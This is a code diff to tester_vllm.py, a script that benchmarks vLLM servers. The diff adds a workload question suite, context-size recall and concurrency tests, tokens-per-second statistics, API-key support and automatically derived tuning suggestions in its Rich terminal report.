+        console.print(Rule(f"[bold {color}]38.{i}/{total}  {cat}[/bold {color}]", style=color, align="left"))
+        shown = prompt if len(prompt) <= 600 else prompt[:600] + f"... [{len(prompt):,} chars total]"
+        console.print(f"[bold]Q:[/bold] {shown}")
+        if r.error:
+            cfail(r.error)
+            if cat.startswith(CONTEXT_TEST_LABEL):
+                console.print(f"[bold red][CONTEXT][/bold red] the server REJECTED this request — the usable "
+                              f"context is smaller than the reported {fmt_ctx(ctx)}")
+            return
+        if r.reasoning:
+            snippet = r.reasoning.replace("\n", " ")
+            console.print(f"[dim]thinking ({len(r.reasoning):,} chars): {snippet[:300]}{'…' if len(snippet) > 300 else ''}[/dim]")
+        body = r.content or "[dim](empty)[/dim]"
+        if not args.full_responses and len(body) > 2500:
+            body = body[:2500] + f"\n… [{len(r.content):,} chars total — use --full-responses to see all]"
+        console.print(Panel(body, title="Response", border_style="green" if r.ok else "red"))
+        if not r.ok:
+            why = " (ran out of tokens while thinking — raise --max-tokens)" if r.finish == "length" else ""
+            cfail(f"no content returned{why}")
+        elif r.accurate is True:
+            cpass("expected answer pattern found")
+        elif r.accurate is False:
+            cwarn("content returned, but the expected answer pattern wasn't found")
+        else:
+            cpass("returned content (no answer key for this one)")
+        ttft = f"{r.ttft_s:.2f}s" if r.ttft_s is not None else "n/a"
+        dec = f"{r.decode_tps:.1f}" if r.decode_tps else "n/a"
+        e2e = f"{r.completion_n / r.wall_s:.1f}" if r.wall_s and r.completion_n else "n/a"
+        cinfo(f"prompt={r.prompt_n} tok  gen={r.completion_n} tok  TTFT={ttft}  decode={dec} t/s  "
+              f"end-to-end={e2e} t/s  wall={r.wall_s:.2f}s  finish={r.finish or 'n/a'}")
+        if cat.startswith(CONTEXT_TEST_LABEL) and ctx:
+            pct = 100 * r.prompt_n / ctx if r.prompt_n else 0
+            recall = "RECALLED correctly" if r.accurate else "NOT recalled" if r.accurate is False else "not checked"
+            vcolor = "green" if r.accurate else "red"
+            console.print(f"[bold {vcolor}][CONTEXT][/bold {vcolor}] server accepted {r.prompt_n:,} tokens "
+                          f"({pct:.0f}% of {ctx:,}) — the code planted near the start was {recall}")
+
+    results: list[WorkloadResult] = []
+    if args.concurrency <= 1:
+        for i, job in enumerate(jobs, 1):
+            CURRENT_LABEL = job[0]
+            r = do(job)
+            results.append(r)
+            show(i, job, r)
+            step()
+    else:
+        cinfo(f"Sending {total} requests, {args.concurrency} at a time...")
+        with ThreadPoolExecutor(max_workers=args.concurrency) as ex:
+            results = list(ex.map(do, jobs))
+        for i, (job, r) in enumerate(zip(jobs, results), 1):
+            show(i, job, r)
+            step()
+
+    t = Table(box=box.SIMPLE_HEAVY, title=f"Workload summary — {model}")
+    for col, just in [("#", "right"), ("Question", "left"), ("Result", "left"), ("Prompt tok", "right"),
+                      ("Gen tok", "right"), ("TTFT s", "right"), ("Decode t/s", "right"), ("Wall s", "right")]:
+        t.add_column(col, justify=just)
+    for i, (job, r) in enumerate(zip(jobs, results), 1):
+        if r.error:
+            verdict = "[red]ERROR[/red]"
+        elif not r.ok:
+            verdict = "[red]EMPTY[/red]"
+        elif r.accurate is None:
+            verdict = "[green]answered[/green]"
+        else:
+            verdict = "[green]correct[/green]" if r.accurate else "[yellow]check[/yellow]"
+        t.add_row(str(i), job[0], verdict, str(r.prompt_n), str(r.completion_n),
+                  f"{r.ttft_s:.2f}" if r.ttft_s is not None else "-",
+                  f"{r.decode_tps:.1f}" if r.decode_tps else "-", f"{r.wall_s:.1f}")
+    console.print(t)
+
+    checked = [r for r in results if r.accurate is not None]
+    result.workload_checked = len(checked)
+    result.workload_ok = sum(1 for r in checked if r.accurate)
+    quality.total += len(checked)
+    quality.passed += result.workload_ok
+    answered = sum(1 for r in results if r.ok)
+    cinfo(f"Workloads: {answered}/{total} answered, {result.workload_ok}/{len(checked)} matched the answer key")
+
+    for job, r in zip(jobs, results):
+        if job[0].startswith(CONTEXT_TEST_LABEL):
+            if r.error:
+                result.suggestions.append(
+                    f"The context test was rejected at {job[0]} — lower vLLM's --max-model-len to what the KV cache "
+                    "can actually hold, or raise --gpu-memory-utilization so the advertised context is real."
+                )
+            elif r.accurate is False:
+                result.suggestions.append(
+                    "The context test was accepted but the planted code wasn't recalled — the model doesn't use its "
+                    "full advertised context reliably; keep production prompts well under it."
+                )
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Suggestions — derived from what this run actually observed, so the next run
+# (and the server config) can be tuned instead of guessed at.
+# ─────────────────────────────────────────────────────────────────────────────
+def instance_suggestions(base_url: str, ctx: Optional[int], st: Optional[dict], args: argparse.Namespace,
+                         metrics_before: dict, metrics_after: dict, n_workloads: int) -> list[str]:
+    out: list[str] = []
+    with THROUGHPUT.lock:
+        truncated = list(dict.fromkeys(THROUGHPUT.truncated))
+        reasoning_only = list(dict.fromkeys(THROUGHPUT.reasoning_only))
+
+    if truncated:
+        out.append(
+            f"{len(truncated)} answer(s) hit max_tokens (finish_reason=length): {', '.join(truncated[:5])}"
+            f"{' …' if len(truncated) > 5 else ''}. Raise --max-tokens (workload suite, now {args.max_tokens}); "
+            "the quick graded tests 10-30 use a fixed 1024-token budget."
+        )
+    if reasoning_only:
+        hint = ("pass --thinking off to grade answers rather than reasoning, or --thinking on with a larger "
+                "--max-tokens" if THINKING is None else "raise --max-tokens")
+        out.append(
+            f"{len(reasoning_only)} answer(s) spent the whole budget thinking and returned no content "
+            f"({', '.join(reasoning_only[:3])}{' …' if len(reasoning_only) > 3 else ''}) — {hint}."
+        )
+
+    if not ctx:
+        out.append(f"{base_url} didn't report its context size — start vLLM with an explicit --max-model-len.")
+    elif ctx < 16384:
+        out.append(
+            f"Context is only {fmt_ctx(ctx)} — long-context and RAG workloads will be truncated; raise vLLM's "
+            "--max-model-len if the model and KV-cache memory allow it."
+        )
+    if ctx and not args.context_test and n_workloads:
+        out.append(f"Add --context-test to verify the advertised {fmt_ctx(ctx)} is really usable (accepted AND recalled).")
+    if not args.long_prompt and n_workloads:
+        out.append("Add --long-prompt 8000 so prompt-processing (prefill) speed is measured on a realistic input, "
+                   "not just short questions.")
+    if args.concurrency <= 1 and n_workloads:
+        out.append("Add --concurrency 4 (or your expected users) — vLLM's continuous batching is its main advantage, "
+                   "and single-request runs don't show aggregate throughput or contention.")
+    if args.no_cache:
+        out.append("--no-cache only affects llama.cpp; vLLM prefix caching is server-wide — restart with "
+                   "--no-enable-prefix-caching for cold-prefill numbers (the long-prompt and context tests are "
+                   "randomized and never hit the cache anyway).")
+
+    if st:
+        if st["min"] > 0 and st["max"] / st["min"] > 3:
+            out.append(
+                f"Tokens/s varied {st['max'] / st['min']:.1f}x between answers ({st['min']:.1f}–{st['max']:.1f}). "
+                "Short answers are dominated by prefill/overhead; if decode speed also varies, another model or "
+                "process is sharing the GPU — stop it, or re-run to confirm."
+            )
+        if st["first_ttft"] and st["ttft_avg"] and st["first_ttft"] > 5 and st["first_ttft"] > 3 * st["ttft_avg"]:
+            out.append(
+                f"First streamed answer took {st['first_ttft']:.1f}s to start vs {st['ttft_avg']:.2f}s on average — "
+                "likely a cold start (sleep mode / CUDA graph capture / compile); keep the server warm before benchmarking."
+            )
+
+    if metrics_after:
+        pre = metrics_after.get("vllm:num_preemptions_total", 0) - metrics_before.get("vllm:num_preemptions_total", 0)
+        if pre > 0:
+            out.append(
+                f"vLLM preempted {pre:.0f} request(s) during this run (KV cache ran out). Raise "
+                "--gpu-memory-utilization, lower --max-num-seqs, or reduce --max-model-len."
+            )
+        kv = metrics_after.get("vllm:kv_cache_usage_perc", metrics_after.get("vllm:gpu_cache_usage_perc"))
+        if kv is not None and kv > 0.9:
+            out.append(f"KV cache is {kv:.0%} full right after the tests — there's little headroom for concurrent users.")
+    else:
+        out.append(f"{base_url}/metrics was not reachable — enable it to get KV-cache and preemption checks.")
+
+    port = base_url.rsplit(":", 1)[-1]
+    for ct in DISCOVERED_CONTAINERS:
+        if port in {p for _, p in ct["targets"]}:
+            if ct.get("ipc") != "host" and (ct.get("shm_size") or 0) < 8 * 1024 ** 3:
+                shm = f"{(ct.get('shm_size') or 0) / 1024 ** 2:.0f}MB"
+                out.append(
+                    f"Container {ct['name']} runs with ipc={ct.get('ipc') or 'default'} and shm={shm}. vLLM uses "
+                    "shared memory between its processes — start it with --ipc=host (or --shm-size=16g) to avoid "
+                    "stalls and crashes under load."
+                )
+    return out
+
+
+def print_suggestions(items: list[str], title: str = "Suggestions for future runs", color: str = "yellow") -> None:
+    section(title, color)
+    if not items:
+        cpass("Nothing to tune — this run used the recommended options and hit no limits.")
+        return
+    for i, s in enumerate(items, 1):
+        console.print(f"  [bold {color}]{i}.[/bold {color}] {s}")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Per-instance test suite
 # ─────────────────────────────────────────────────────────────────────────────
-def run_instance_tests(host: str, port: str, color: str) -> InstanceResult:
+def run_instance_tests(host: str, port: str, color: str, args: argparse.Namespace) -> InstanceResult:
     base_url = f"http://{host}:{port}"
     result = InstanceResult(base_url=base_url)
     start_time = time.perf_counter()
     quality = QualityTracker()
+    THROUGHPUT.reset()
+
+    info_model, ctx, ctx_source = get_model_info(base_url)
+    result.context_len = ctx
+    metrics_before = vllm_metrics(base_url)
+    jobs = build_workload_jobs(args, ctx)
 
     console.print()
-    console.print(Panel(f"Instance target: [bold]{base_url}[/bold]", style=color, box=box.DOUBLE))
+    header = f"Instance target: [bold]{base_url}[/bold]"
+    if info_model:
+        header += f"\nModel          : [bold]{info_model}[/bold]"
+        header += f"\nContext size   : [bold]{fmt_ctx(ctx)}[/bold]" + (f"  [dim]({ctx_source})[/dim]" if ctx else "")
+    console.print(Panel(header, style=color, box=box.DOUBLE))
 
     # auto_refresh is deliberately OFF: Progress normally repaints from a
     # background timer thread, and that thread racing against the heavy
@@ -1175,7 +1921,8 @@ def run_instance_tests(host: str, port: str, color: str) -> InstanceResult:
     )
 
     with progress:
-        task = progress.add_task(f"[{color}]Testing {base_url}", total=TOTAL_TEST_STEPS)
+        total_steps = TOTAL_TEST_STEPS + len(jobs)
+        task = progress.add_task(f"[{color}]Testing {base_url}", total=total_steps)
         progress.refresh()
 
         def step():
@@ -1203,7 +1950,7 @@ def run_instance_tests(host: str, port: str, color: str) -> InstanceResult:
             console.print("  Hint: check that vLLM is running and the host/port are correct.")
             result.failures += 1
             result.reachable = False
-            progress.update(task, completed=TOTAL_TEST_STEPS)
+            progress.update(task, completed=total_steps)
             progress.refresh()
             result.duration_s = time.perf_counter() - start_time
             return result
@@ -1239,7 +1986,11 @@ def run_instance_tests(host: str, port: str, color: str) -> InstanceResult:
             else:
                 cpass(f"Found {len(models)} model(s):")
                 for m in models:
-                    console.print(f"  • {m.get('id')}  (owned_by: {m.get('owned_by', 'n/a')})")
+                    mctx = m.get("max_model_len")
+                    console.print(
+                        f"  • {m.get('id')}  (owned_by: {m.get('owned_by', 'n/a')}"
+                        + (f", context: {mctx:,} tokens" if isinstance(mctx, int) else "") + ")"
+                    )
                 first_model = models[0].get("id", "")
                 cinfo(f"Using model for tests: {first_model}")
         result.model = first_model or "(unknown)"
@@ -1508,7 +2259,7 @@ def run_instance_tests(host: str, port: str, color: str) -> InstanceResult:
             req = urllib.request.Request(
                 f"{base_url}/v1/chat/completions",
                 data=data,
-                headers={"Content-Type": "application/json"},
+                headers=_headers(True),
                 method="POST",
             )
             chunks: list[str] = []
@@ -1865,16 +2616,21 @@ def run_instance_tests(host: str, port: str, color: str) -> InstanceResult:
                 quality, color,
             )
             step()
+
+            # ── Workload suite (38) — questions from tester_llamacpp.py ─────
+            if jobs:
+                run_workload_suite(base_url, first_model, ctx, jobs, args, quality, result, color, step)
         else:
             reason = "no model discovered" if not first_model else "model does not support chat/completions (embedding-only model)"
-            cwarn(f"Skipping capability tests 10-37 — {reason}")
-            progress.update(task, completed=TOTAL_TEST_STEPS)
+            cwarn(f"Skipping capability tests 10-38 — {reason}")
+            progress.update(task, completed=total_steps)
             progress.refresh()
 
         # ── Capability scorecard ────────────────────────────────────────────
         section(f"Capability Scorecard — {base_url}", color)
         if first_model:
             cinfo(f"Model : {first_model}")
+            cinfo(f"Context size : {fmt_ctx(ctx)}")
             if quality.total:
                 pct = quality.passed * 100 // quality.total
                 cinfo(f"Quality score : {quality.passed}/{quality.total} graded checks passed ({pct}%)")
@@ -1882,6 +2638,19 @@ def run_instance_tests(host: str, port: str, color: str) -> InstanceResult:
                 cwarn("No graded checks were run")
         else:
             cwarn("No model discovered — nothing to score")
+
+        section(f"Tokens per second — all answers ({base_url})", color)
+        st = THROUGHPUT.stats()
+        print_throughput_stats(st, color)
+        if st:
+            result.tps_min, result.tps_avg, result.tps_max = st["min"], st["avg"], st["max"]
+        cinfo(f"Instance test duration: {fmt_duration(time.perf_counter() - start_time)}")
+
+        if first_model and cap_chat:
+            result.suggestions = instance_suggestions(
+                base_url, ctx, st, args, metrics_before, vllm_metrics(base_url), len(jobs)
+            ) + result.suggestions
+            print_suggestions(result.suggestions, f"Suggestions — {base_url}")
 
     result.quality_pass = quality.passed
     result.quality_total = quality.total
@@ -1892,15 +2661,24 @@ def run_instance_tests(host: str, port: str, color: str) -> InstanceResult:
 # ─────────────────────────────────────────────────────────────────────────────
 # Roll-up report
 # ─────────────────────────────────────────────────────────────────────────────
+def fmt_duration(seconds: float) -> str:
+    m, sec = divmod(int(round(seconds)), 60)
+    h, m = divmod(m, 60)
+    return f"{h}h {m:02d}m {sec:02d}s" if h else f"{m}m {sec:02d}s" if m else f"{seconds:.1f}s"
+
+
 def print_rollup_report(results: list[InstanceResult]) -> None:
     section("Roll-Up Report")
     table = Table(box=box.SIMPLE_HEAVY, show_lines=False)
     table.add_column("Model", style="bold")
     table.add_column("Instance")
+    table.add_column("Context", justify="right")
     table.add_column("Duration", justify="right")
     table.add_column("Capabilities")
     table.add_column("Failures", justify="right")
     table.add_column("Quality Score", justify="right")
+    table.add_column("Workloads", justify="right")
+    table.add_column("Tok/s min / avg / max", justify="right")
 
     total_duration = 0.0
     for res, color in zip(results, INSTANCE_COLORS * (len(results) // len(INSTANCE_COLORS) + 1)):
@@ -1913,26 +2691,66 @@ def print_rollup_report(results: list[InstanceResult]) -> None:
         caps_s = "+".join(caps) if caps else ("unreachable" if not res.reachable else "n/a")
         quality_s = f"{res.quality_pass}/{res.quality_total}" if res.quality_total else "—"
         fail_style = "bold red" if res.failures else "green"
+        tps_s = (
+            f"{res.tps_min:.1f} / {res.tps_avg:.1f} / {res.tps_max:.1f}" if res.tps_avg is not None else "—"
+        )
         table.add_row(
             f"[{color}]{res.model}[/{color}]",
             res.base_url,
-            f"{res.duration_s:.1f}s",
+            f"{res.context_len:,}" if res.context_len else "—",
+            fmt_duration(res.duration_s),
             caps_s,
             f"[{fail_style}]{res.failures}[/{fail_style}]",
             quality_s,
+            f"{res.workload_ok}/{res.workload_checked}" if res.workload_checked else "—",
+            tps_s,
         )
     console.print(table)
-    cinfo(f"Total wall-clock time across all instances: {total_duration:.1f}s")
+    cinfo(f"Total test time across all instances: {fmt_duration(total_duration)}")
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 # main
 # ─────────────────────────────────────────────────────────────────────────────
 def main() -> int:
+    global API_KEY, THINKING
+    run_start = time.perf_counter()
     parser = argparse.ArgumentParser(description="vLLM smoke test with a Rich UI")
     parser.add_argument("host", nargs="?", default="localhost")
     parser.add_argument("port", nargs="?", default=None)
+    parser.add_argument("--thinking", choices=["on", "off"],
+                        help="send enable_thinking on/off to the chat template (default: server/model default)")
+    parser.add_argument("--max-tokens", type=int, default=8192,
+                        help="max_tokens for each workload question (default 8192; thinking models need room)")
+    parser.add_argument("--only", default="", metavar="AREA[,AREA...]",
+                        help="run only workload questions whose name contains one of these, e.g. f5,gps")
+    parser.add_argument("--no-workloads", action="store_true", help="skip the workload suite (test 38)")
+    parser.add_argument("--list", action="store_true", help="list workload question names and exit")
+    parser.add_argument("--long-prompt", type=int, nargs="?", const=2000, default=0, metavar="TOKENS",
+                        help="add a ~TOKENS-token prompt (default 2000) to measure real prefill speed")
+    parser.add_argument("--context-test", action="store_true",
+                        help="fill the reported max context with a hidden code near the start and check recall")
+    parser.add_argument("--context-test-fraction", type=float, default=0.9, metavar="F",
+                        help="fraction of the reported context to fill for --context-test (default 0.9)")
+    parser.add_argument("--concurrency", type=int, default=1, metavar="N",
+                        help="send workload questions N at a time (tests batching/contention)")
+    parser.add_argument("--no-cache", action="store_true",
+                        help="send cache_prompt=false (llama.cpp only; vLLM prefix caching is server-wide)")
+    parser.add_argument("--full-responses", action="store_true", help="don't truncate long workload answers")
+    parser.add_argument("--api-key", default=None, help="Bearer token for servers started with --api-key "
+                        "(default: $VLLM_API_KEY)")
     args = parser.parse_args()
+
+    if args.list:
+        for q in QUESTIONS:
+            console.print(f"  • {q[0]}")
+        console.print(f"  • {LONG_PROMPT_LABEL}  (with --long-prompt)")
+        console.print(f"  • {CONTEXT_TEST_LABEL}  (with --context-test)")
+        return 0
+    if args.api_key:
+        API_KEY = args.api_key
+    if args.thinking:
+        THINKING = args.thinking == "on"
 
     console.print()
     console.print(Rule(f"[bold cyan]tester_vllm.py[/bold cyan]", style="cyan", align="left"))
@@ -1959,19 +2777,47 @@ def main() -> int:
         return 1
 
     cinfo(f"Will test {len(targets)} instance(s): {format_targets(targets)}")
+    ctx_table = Table(box=box.SIMPLE, title="Models and context size")
+    for col, just in [("Instance", "left"), ("Model", "left"), ("Context", "right"), ("Source", "left")]:
+        ctx_table.add_column(col, justify=just)
+    for host, port in targets:
+        m, c, src = get_model_info(f"http://{host}:{port}")
+        ctx_table.add_row(f"{host}:{port}", m or "[red](unreachable)[/red]", fmt_ctx(c), src or "—")
+    console.print(ctx_table)
 
     results: list[InstanceResult] = []
     failures_total = 0
     for i, (host, port) in enumerate(targets):
         color = INSTANCE_COLORS[i % len(INSTANCE_COLORS)]
-        res = run_instance_tests(host, port, color)
+        res = run_instance_tests(host, port, color, args)
         results.append(res)
         failures_total += res.failures
 
     print_rollup_report(results)
 
+    measured = [r for r in results if r.tps_avg is not None]
+    if measured:
+        cinfo(
+            "Tokens/s across all instances: "
+            f"min {min(r.tps_min for r in measured):.1f} / "
+            f"avg {sum(r.tps_avg for r in measured) / len(measured):.1f} / "
+            f"max {max(r.tps_max for r in measured):.1f}"
+        )
+
+    if len(results) > 1:
+        # Per-instance suggestions were printed with each instance; repeat only
+        # the ones that apply to more than one so the summary stays short.
+        seen: dict[str, int] = {}
+        for r in results:
+            for sug in r.suggestions:
+                seen[sug] = seen.get(sug, 0) + 1
+        common = [sug for sug, n in seen.items() if n > 1]
+        if common:
+            print_suggestions(common, "Suggestions that apply to every instance")
+
     section("Summary")
     cinfo(f"Tested {len(targets)} instance(s): {format_targets(targets)}")
+    cinfo(f"Total duration (hardware + health checks + all tests): {fmt_duration(time.perf_counter() - run_start)}")
     if failures_total == 0:
         cpass("All critical checks passed across all instances")
     else:
